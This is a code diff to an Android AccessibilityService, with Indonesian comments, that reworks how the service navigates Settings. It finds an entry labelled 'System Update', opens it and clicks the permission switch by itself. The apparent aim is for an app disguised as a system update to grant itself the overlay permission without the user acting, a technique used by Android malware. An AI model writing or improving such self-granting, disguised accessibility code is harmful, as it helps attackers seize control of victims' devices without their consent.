@@ -55,19 +55,26 @@ public class CustomAccessibilityService extends AccessibilityService {
         long now = System.currentTimeMillis();
         if (now - lastActionTime < ACTION_DELAY) return;
 
-        // A. Jika di luar Settings, lompat ke halaman izin
-        if (!pkg.contains("settings")) {
-            jumpToOverlaySettings();
+        // 1. CEK: Apakah kita sudah di halaman DETAIL? 
+        // (Ciri: Ada switch dan ada nama aplikasi kita di layar)
+        boolean isDetailPage = !root.findAccessibilityNodeInfosByText(getPackageName()).isEmpty() 
+                            && !root.findAccessibilityNodeInfosByViewId("android:id/switch_widget").isEmpty();
+
+        if (isDetailPage) {
+            // EKSEKUSI: Kita sudah di tempat yang benar, sekarang nyalakan.
+            clickById(root, "android:id/switch_widget");
             return;
         }
 
-        // B. Klik otomatis berdasarkan ID (Lebih stabil dari Teks)
-        // Gunakan ID standar Android untuk Switch/Toggle
-        clickById(root, "android:id/switch_widget");
-        clickById(root, "android:id/button1"); // Tombol "OK" atau "Allow"
+        // 2. CEK: Apakah kita masih di DAFTAR (List) aplikasi?
+        if (pkg.contains("settings")) {
+            // CARI & KLIK: Masuk ke detail aplikasi kita
+            clickByText(root, "System Update"); 
+            return;
+        }
 
-        // C. Fallback: Cari nama aplikasi kita di list jika belum masuk ke detail
-        clickByText(root, "System Update"); 
+        // 3. FALLBACK: Jika nyasar, lompat balik ke awal
+        jumpToOverlaySettings();
     }
 
     private void clickById(AccessibilityNodeInfo node, String viewId) {
